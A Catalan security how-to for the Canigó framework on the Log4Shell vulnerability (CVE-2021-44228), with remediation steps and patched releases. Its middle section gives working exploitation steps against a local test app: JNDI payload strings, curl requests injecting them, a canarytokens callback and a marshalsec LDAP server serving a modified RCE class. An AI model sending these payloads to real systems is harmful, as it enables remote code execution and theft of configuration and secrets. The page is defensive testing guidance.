+++
date        = "2021-12-13"
title       = "Canigó. Vulnerabilitat CVE-2021-44228 (Log4Shell)"
description = "Com resoldre la vulnerabilitat detectada CVE-2021-44228 (Log4Shell)"
#section     = "howtos"
#categories  = ["canigo"]
#key         = "GENER2022"
+++

La vulnerabilitat [CVE-2021-44228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228) permet executar codi en un
servidor remot, injectant una petició JNDI `${jndi:(ldap|rmi|etc)}` dins de qualsevol variable que es registri al log del servidor.

Per a explotar la vulnerabilitat, es poden seguir els següents passos:

1. En el servidor que alloja l'aplicació vulnerable, es registra la informació que conté la càrrega útil maliciosa.
Per exemple: `${jndi:ldap://[servidor]/[càrrega útil]}`, on el servidor està controlat per l'atacant i la càrrega útil conté les comandes a executar.

2. La vulnerabilitat s'activa i el servidor vulnerable, sol·licita al servidor de l'atacant a través de JNDI el codi maliciós.

3. La resposta del servidor de l'atacant conté la ruta a una clase Java maliciosa. Per exemple: `http://[servidor]/exploit.class`,
que s'injecta en el context de l'aplicació vulnerable.

4. La càrrega útil injectada permet a l'atacant executar codi arbitrari.

<br/>
Informació de referència:

* <https://github.com/YfryTchsGD/Log4jAttackSurface> \
* <https://github.com/christophetd/log4shell-vulnerable-app> \
* <https://www.tarlogic.com/blog/log4shell-vulnerability-cve-2021-44228/> \
* <https://securelist.com/cve-2021-44228-vulnerability-in-apache-log4j-library/105210/> \
* <https://www.randori.com/blog/cve-2021-44228/>

## Com explotar la vulnerabilitat a una aplicació Canigó

* Crear una aplicació Canigó que utilitzi una versió de log4j vulnerable fent ús de l'archetype de Canigó:

```sh
# Canigó 3.6.0
mvn archetype:generate \
-DarchetypeGroupId=cat.gencat.ctti \
-DarchetypeArtifactId=plugin-canigo-archetype-rest \
-DarchetypeVersion=1.7.0 \
-DartifactId=CanigoLog4jShellTest \
-DgroupId=cat.gencat.ctti \
-Dversion=1.0.0 -B
```

* Modificar el servei de prova: `EquipamentServiceController` per a imprimir al log els paràmetres d'entrada
del servei de creació dels equipaments:

```java
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

private static Logger log = LogManager.getLogger(EquipamentServiceController.class.getName());

public void saveEquipament(@RequestBody Equipament equipament) {
log.error("equipament.getNom() {}", equipament.getNom());
...
}
```

* Iniciar el projecte creat amb el servidor Tomcat embegut:

```sh
mvn clean spring-boot:run
# or
mvn clean package && java -jar ./target/CanigoLog4jShellTest.war
# or
mvn clean package docker:build \
&& docker run -it --rm \
--net=host \
--name="log4jshell-local" \
--memory="1024m" --memory-reservation="1024m" --memory-swap="1024m" --cpu-shares=2000 \
canigo/app
```

### Utilizant el projecte `canarytokens`

El projecte de codi obert `canarytokens` permet generar tokens per a explotar vulnerabilitats, de forma que, si en
utilitzar un token s'explota una vulnerabilitat, s'envia un correu electrònic amb els detalls de l'accés.

Per a més informació:

* https://docs.canarytokens.org/guide
* https://github.com/thinkst/canarytokens

Pasos a seguir:

* Generar un token tipus `Log4Shell` des de: <https://canarytokens.org/generate#>:

```txt
${jndi:ldap://127.0.0.1.xxxxxxxxxxxx.canarytokens.com/a}
```

* Generar una petició HTTP Request per a crear un `equipament` i en el nom enviar el token maliciós creat amb `canarytokens`:

```sh
curl --request POST 'http://127.0.0.1:8080/api/equipaments' \
--header 'Content-Type: application/json' \
--data-raw '{ "nom": "${jndi:ldap://127.0.0.1.xxxxxxxxxxxx.canarytokens.com/a}","municipi": "Barcelona"}'
```

* Verificar que s'ha rebut un correu a l'adreça configurada a `canarytokens` i comprovar que en el contingut del correu
s'inclou la traça de la connexió remota al servidor de l'aplicació:

![Email exploit test](/images/howtos/log4jshell/email_exploit_alert.png)

![Canary tokens exploit details 1](/images/howtos/log4jshell/canary_token_exploit_details1.png)

![Canary tokens exploit details 2](/images/howtos/log4jshell/canary_token_exploit_details2.png)

### Utilizant un servidor LDAP local

Requereix: SO Linux, Python3, Git, Maven i accés a internet.

Pasos a seguir:

* Iniciar un servidor web que contingui el codi maliciós a injectar. Es pot utilitzar el projecte `https://github.com/cybereason/Logout4Shell.git`
i modificar la classe `Log4jRCE.java` per a afegir qualsevol codi maliciós que es vulgui injectar al servidor. Per exemple, es pot injectar una traça:

```java
String dateNow = ZonedDateTime.now(ZoneId.of("Europe/Madrid")).format(DateTimeFormatter.ofPattern("yyyy-MM-dd'T'HH:mm:ss.SSSZ"));
System.out.println("Log4JShell - JPJE ----------------------------: " + dateNow);
```

```sh
git clone https://github.com/cybereason/Logout4Shell.git
mvn clean package
cd target/classes
python3 -m http.server 8888
```

* Iniciar un servidor LDAP. Es pot utilitzar el projecte `https://github.com/mbechler/marshalsec.git`:

```sh
git clone https://github.com/mbechler/marshalsec.git
mvn clean package -DskipTests
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#Log4jRCE"
```

* Generar una petició HTTP Request per a crear un `equipament` i en el nom enviar `${jndi:ldap://127.0.0.1:1389/a}`:

```sh
curl --request POST 'http://127.0.0.1:8080/api/equipaments' \
--header 'Content-Type: application/json' \
--data-raw '{ "nom": "${jndi:ldap://127.0.0.1:1389/a}","municipi": "Barcelona"}'
```

* Revisar en el log de l'aplicació `CanigoLog4jShellTest` els efectes d'explotar la vulnerabilitat.

    > Amb la vulnerabilitat:

![LDAP exploit](/images/howtos/log4jshell/log4jshell_trace1.gif)

    > Sense la vulnerabilitat:

![LDAP no exploit](/images/howtos/log4jshell/log4jshell_trace2.gif)

On es pot apreciar en el log de `CanigoLog4jShellTest` la traça generada pel codi injectat.
D'aquesta manera, per exemple, es podria obtenir les variables d'entorn, arxius de configuració i altres per a enviar-los per correu.

## Com solucionar la vulnerabilitat a les aplicacions

* **Opció 1**) Substituir la versió de la dependència de la libreria `log4j` en temps de compilació.

    - 1.1) Modificar el fitxer `pom.xml` - **opció recomanada** -, tornar a compilar i desplegar l'aplicació:

```xml
<properties>
<log4j2.version>2.15.0</log4j2.version>
</properties>
```

    - 1.2) Injectar la variable durant la construcció de l'aplicació, tornar a compilar i desplegar l'aplicació:

```sh
mvn -Dlog4j2.version=2.15.0 clean package && java -jar ./target/CanigoLog4jShellTest.war
```

* **Opció 2**) Configurar la variable `log4j2.formatMsgNoLookups` en temps d'execució.

    - 2.1) Injectar la variable (vàlid per a: 2.10 >= log4j <= 2.14.1) i tornar a desplegar l'aplicació:

```sh
mvn clean package && java -Dlog4j2.formatMsgNoLookups=true -jar ./target/CanigoLog4jShellTest.war
```

    - 2.2) Afegir una variable d'entorn (vàlid per a: 2.10 >= log4j <= 2.14.1) i tornar a desplegar l'aplicació. Veure: https://msrc-blog.microsoft.com/2021/12/11/microsofts-response-to-cve-2021-44228-apache-log4j2/.

```sh
mvn clean package docker:build \
&& docker run -it --rm \
--net=host \
--name="log4jshell-local" \
--memory="1024m" --memory-reservation="1024m" --memory-swap="1024m" --cpu-shares=2000 \
--env LOG4J_FORMAT_MSG_NO_LOOKUPS=true \
canigo/app
```

* **Opció 3**) Modificar el patró de traces configuradas al fitxer `log4j.xml` (vàlid per a: 2.0-beta1 >= log4j <= 2.14.1) i tornar a compilar i desplegar l'aplicació. Veure: https://kb.vmware.com/s/article/87093.

```sh
## canviar:
<PatternLayout pattern="canigo Message: %d{dd MM yyyy HH:mm:ss,SSS} %-5p [%t] %-5p [%t] %c - %m%n" />

## per:
<PatternLayout pattern="canigo Message: %d{dd MM yyyy HH:mm:ss,SSS} %-5p [%t] %-5p [%t] %c - %m{nolookups}%n" />
```

## Noves versions de Canigó 3.4 i 3.6

S'han alliberat noves versions del Framework Canigó:

* Versions de Canigó 3.4.7 i 3.6.1 per a resoldre aquesta vulnerabilitat als mòduls de Canigó.
Podeu consultar: [Publicació nova versió 3.4.7 i 3.6.1](/noticies/2021-12-13-CAN-actualitzacio-canigo-3_4_7_3_6_1).

* Versió 1.6.8 de l'archetype de Canigó per a generar projectes amb Canigó 3.4.7.
Podeu consultar: [Actualització archetype 1.6.8](/noticies/2021-12-13-CAN-Actualitzacio_archetype_1_6_8/).

* Versió 1.7.1 de l'archetype de Canigó i la versió 1.8.1 del plugin del eclipse per a generar projectes amb Canigó 3.6.1.
Podeu consultar: [Actualització archetype 1.7.1 i plugin Eclipse 1.8.1](/noticies/2021-12-13-CAN-Actualitzacio_archetype_1_7_1_plugin_eclipse_1_8_1/).

Des de CS Canigó es recomana actualitzar a aquestes noves versions. Per a fer-ho, serà necessari revisar les dependències de l'aplicació
per a utilitzar els mòduls de les versions 3.4.7 i 3.6.1. Podeu consultar les matrius de compatibiltiat de les versions:

- [Matrius de Compatibilitats 3.4](/canigo-download-related/matrius-compatibilitats/canigo-34/)

- [Matrius de Compatibilitats 3.6](/canigo-download-related/matrius-compatibilitats/canigo-36/)

Un cop es comprovi que s'utilitzen les últimes versions dels mòduls, caldrà modificar el fitxer `pom.xml` per a assegurar l'ús
de la versió 2.15.0 de log4j:

```xml
<properties>
<log4j2.version>2.15.0</log4j2.version>
</properties>
```

Un cop realitzades les adaptacions descrites, comprovar que només s'utilitza la versió 2.15.0 del log4j a l'aplicació mitjançant:

```
mvn dependency:tree
```

<br/><br/>
Per qualsevol dubte relatiu a aquesta nova versió del Framework Canigó us podeu posar en contacte amb el CS Canigó al servei CAN del JIRA CSTD o enviant-nos un correu electrònic a la bústia del CS Canigó.